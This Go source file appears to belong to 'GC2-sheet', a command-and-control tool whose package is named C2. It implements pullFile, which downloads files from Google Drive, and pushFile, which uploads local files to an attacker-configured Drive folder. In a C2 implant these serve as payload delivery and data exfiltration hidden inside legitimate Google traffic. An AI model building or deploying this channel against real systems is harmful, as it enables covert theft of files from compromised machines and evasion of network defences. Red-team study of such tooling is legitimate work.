package C2

import (
	"GC2-sheet/internal/configuration"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
)

type GoogleFileSystem struct {
	client        *http.Client
	googleDriveID string
}

type File struct {
	DriveId string   `json:"driveId"`
	Name    string   `json:"name"`
	Parents []string `json:"parents"`
}

func NewGoogleFileSystem(connector *GoogleConnector) *GoogleFileSystem {
	return &GoogleFileSystem{
		client:        connector.client,
		googleDriveID: configuration.GetOptionsGoogleDriveID(),
	}
}

func (g *GoogleFileSystem) pullFile(fileId string) ([]byte, error) {

	url := fmt.Sprintf(
		"https://www.googleapis.com/drive/v3/files/%s?alt=media",
		fileId,
	)

	req, err := http.NewRequest("GET", url, nil)

	resp, err := g.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("%w: %w", ErrorUnableToPullFile, err)
	}

	defer resp.Body.Close()

	fileDownloaded, err := io.ReadAll(resp.Body)
	if err != nil {
		if err != nil {
			return nil, fmt.Errorf("%w: %w", ErrorUnableToPullFile, err)
		}
	}

	return fileDownloaded, nil
}

func (g *GoogleFileSystem) pushFile(fileName string, file *os.File) error {

	body := &bytes.Buffer{}
	multipartWriter := multipart.NewWriter(body)

	part1, err := multipartWriter.CreatePart(map[string][]string{
		"Content-Type": {"application/json"},
	})
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToPushFile, err)
	}

	fileUpload := File{
		DriveId: g.googleDriveID,
		Name:    fileName,
		Parents: []string{g.googleDriveID},
	}

	fileUploadBody, _ := json.Marshal(fileUpload)

	_, err = part1.Write(fileUploadBody)
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToPushFile, err)
	}

	fileContent, err := io.ReadAll(file)
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToPushFile, err)
	}
	mime := http.DetectContentType(fileContent)

	part2, err := multipartWriter.CreatePart(map[string][]string{
		"Content-Type": {mime},
	})

	_, err = part2.Write(fileContent)
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToPushFile, err)
	}

	multipartWriter.Close()

	url := fmt.Sprintf(
		"https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
	)

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToPushFile, err)
	}
	req.Header.Set("Content-Type", fmt.Sprintf("multipart/related; boundary=%s", multipartWriter.Boundary()))

	_, err = g.client.Do(req)
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToPushFile, err)
	}

	return err

}
